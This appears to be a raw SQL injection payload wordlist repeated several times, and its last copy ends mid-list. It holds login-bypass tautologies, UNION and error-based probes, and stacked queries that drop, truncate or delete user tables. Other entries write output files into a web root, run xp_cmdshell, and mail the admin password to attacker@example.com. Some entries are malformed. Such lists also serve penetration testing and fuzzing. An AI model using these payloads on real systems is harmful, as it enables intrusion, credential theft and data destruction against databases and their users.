SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND LENGTH('abc')=3;--
1'; DECLARE @var INT; SET @var = (SELECT COUNT(*) FROM users); IF @var > 1 RAISERROR('Too many rows', 16, 1); --
1'; EXEC sp_executesql N'SELECT * FROM users WHERE username = @username AND password = @password', N'@username NVARCHAR(50), @password NVARCHAR(50)', @username = 'admin', @password = 'password'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC sp_send_dbmail @recipients='attacker@example.com', @subject='SQLi attack', @body=@var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC xp_cmdshell 'echo ' + @var + ' > C:\output.txt'; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT password FROM users WHERE username = 'admin'); EXEC master.dbo.xp_cmdshell @var; --
1'; CREATE VIEW malicious_view AS SELECT * FROM users; --
1'; CREATE TRIGGER malicious_trigger ON users FOR INSERT AS INSERT INTO logs (log_data) VALUES ('User inserted'); --
1'; CREATE FUNCTION malicious_function() RETURNS TABLE AS RETURN (SELECT * FROM users); SELECT * FROM malicious_function(); --
1'; EXEC('SELECT * FROM users WHERE username = ''' + 'admin' + ''' AND password = ''' + 'password' + ''''); --
1'; MERGE INTO users USING (SELECT 'admin' AS username, 'password' AS password) AS attacker ON users.username = attacker.username WHEN MATCHED THEN UPDATE SET users.password = attacker.password; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + ':' + password FROM users FOR XML PATH('')); PRINT @var; --
1'; DECLARE @var NVARCHAR(MAX); SET @var = (SELECT username + CHAR(58) + password FROM users); PRINT @var; --
 OR 1=(SELECT 1/0); --
' OR 1=(SELECT COUNT(*) FROM non_existent_table); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT 1 FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>0); --
' OR 1=(SELECT username FROM users WHERE username='admin' AND (SELECT COUNT(*) FROM users)>1); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
' OR 1=(SELECT 1/0); --
' OR 1=(SELECT CAST('test' AS INT)); --
' OR 1=(SELECT COALESCE(username, 'admin')) FROM users WHERE username='admin'; --
' OR 1=(SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT username FROM users WHERE username='admin') END); --
' OR 1=(SELECT IFNULL(username, 'admin') FROM users WHERE username='admin'); --
' OR 1=(SELECT CONCAT(username, password) FROM users WHERE username='admin'); --
' OR 1=(SELECT NULLIF(username, '') FROM users WHERE username='admin'); --
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT TOP 1 password FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MIN(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT MAX(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT AVG(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT SUM(password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CONCAT(username, '-', password) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COALESCE(password, 'No password') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT NULLIF(password, '') FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CAST(password AS INT) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT CHAR(65) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT() FROM users) HAVING COUNT() > 1;
SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;
' OR 'a'='a
' OR 'a'='b
' OR '1'='1
' OR '1'='2
' OR 1=1--
' OR 1=2--
' OR 'a'='a'--
' OR 'a'='b'--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1 OR '1'='2'
' OR 1/0 --
' OR 1/1 --
' OR 1/2 --
' OR 'a'='a'--
' OR 'a'='b'--
' OR '1'='1'--
' OR '1'='2'--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
UNION ALL VALUES (1,2,3)--
1 OR 'a'='a'
1 OR 'a'='b'
1 OR '1'='1'
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM non_existent_table);--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%');--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION ALL SELECT NULL,NULL,NULL;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) ORDER BY 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) GROUP BY username;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) HAVING COUNT(*) > 1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) LIMIT 1,1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) UNION SELECT * FROM sensitive_data;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO OUTFILE '/var/www/html/output.txt';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON PATH;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR XML RAW;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) FOR JSON AUTO, INCLUDE_NULL_VALUES;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) INTO DUMPFILE '/var/www/html/output.txt';--
1'; UPDATE users SET password='new_password' WHERE username='admin';--
1'; DELETE FROM users WHERE username='admin';--
1'; INSERT INTO users (username, password) VALUES ('attacker', 'hacked');--
1'; CREATE TABLE malicious_table (data VARCHAR(255));--
1'; DROP TABLE users;--
1'; ALTER TABLE users ADD COLUMN email VARCHAR(255);--
1'; TRUNCATE TABLE users;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users WHERE password LIKE '%pass%') OR 1=1;--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='1';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND '1'='2';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='a';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a'='b';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'a%';--
1'; SELECT * FROM users WHERE username='admin' AND password=(SELECT COUNT(*) FROM users) AND 'a' LIKE 'b%';--
